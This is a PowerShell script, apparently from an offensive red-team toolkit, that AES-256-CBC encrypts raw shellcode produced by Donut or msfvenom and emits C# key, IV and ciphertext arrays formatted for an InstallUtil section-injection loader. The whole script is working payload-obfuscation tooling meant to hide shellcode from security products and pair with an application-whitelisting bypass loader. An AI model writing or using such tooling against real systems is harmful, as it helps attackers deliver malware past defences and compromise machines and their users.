<#
.SYNOPSIS
  Encrypts raw shellcode with AES-256-CBC and outputs C# byte arrays for Key, IV, and ciphertext.

.DESCRIPTION
  Takes a raw shellcode binary file (from Donut or msfvenom) and produces a C# source file
  containing three byte arrays ready to paste into an InstallUtil loader:
    - AesKey              (32 bytes)
    - AesIV               (16 bytes)
    - EncryptedShellcode  (ciphertext)

  The Key and IV are randomly generated each run. Save them securely - they are required
  for decryption at runtime.

.EXAMPLE
  .\aes-encrypt-shellcode.ps1 -InputFile shellcode.bin -OutputFile aes_data.cs

.NOTES
  Requires: PowerShell 5.1+ (uses System.Security.Cryptography.Aes)
  Output format matches the placeholder arrays in installutil/section-injection/Loader.cs
#>
param(
    [Parameter(Mandatory=$true)][string]$InputFile,
    [Parameter(Mandatory=$true)][string]$OutputFile
)

# Resolve to absolute path to handle relative paths correctly
if (-not [IO.Path]::IsPathRooted($InputFile)) {
    $InputFile = Join-Path (Get-Location) $InputFile
}
if (-not [IO.Path]::IsPathRooted($OutputFile)) {
    $OutputDir = Join-Path (Get-Location) (Split-Path $OutputFile -Parent)
    if ($OutputDir -and -not (Test-Path $OutputDir)) { New-Item -ItemType Directory -Path $OutputDir -Force }
    $OutputFile = Join-Path (Get-Location) $OutputFile
}

$plaintext = [IO.File]::ReadAllBytes($InputFile)
if ($plaintext.Length -eq 0) {
    Write-Warning "Input file is empty or 0 bytes - ciphertext will be a single padding block (16 bytes)"
}
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.KeySize = 256
$aes.Mode    = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$aes.GenerateKey()
$aes.GenerateIV()

$encryptor = $aes.CreateEncryptor()
$ciphertext = $encryptor.TransformFinalBlock($plaintext, 0, $plaintext.Length)

function Format-ByteArray($bytes, $name, $type = "byte") {
    if ($null -eq $bytes -or $bytes.Length -eq 0) {
        # Empty array - output valid C# empty initializer (not { 0x })
        return "private static readonly $type[] $name = new $type[0] { };"
    }
    $hex = ($bytes | ForEach-Object { "0x{0:X2}" -f $_ }) -join ","
    "private static readonly $type[] $name = new $type[$($bytes.Length)] { $hex };"
}

$out = @()
$out += "// Generated by aes-encrypt-shellcode.ps1"
$out += "// Plaintext size: $($plaintext.Length) bytes"
$out += "// Ciphertext size: $($ciphertext.Length) bytes"
$out += ""
$out += Format-ByteArray $aes.Key        "AesKey"
$out += Format-ByteArray $aes.IV         "AesIV"
$out += Format-ByteArray $ciphertext     "EncryptedShellcode"

$out -join "`n" | Set-Content -Path $OutputFile -Encoding ASCII
Write-Host "[+] Wrote AES data to $OutputFile"
Write-Host "[!] Save the key/IV securely - they are required for decryption"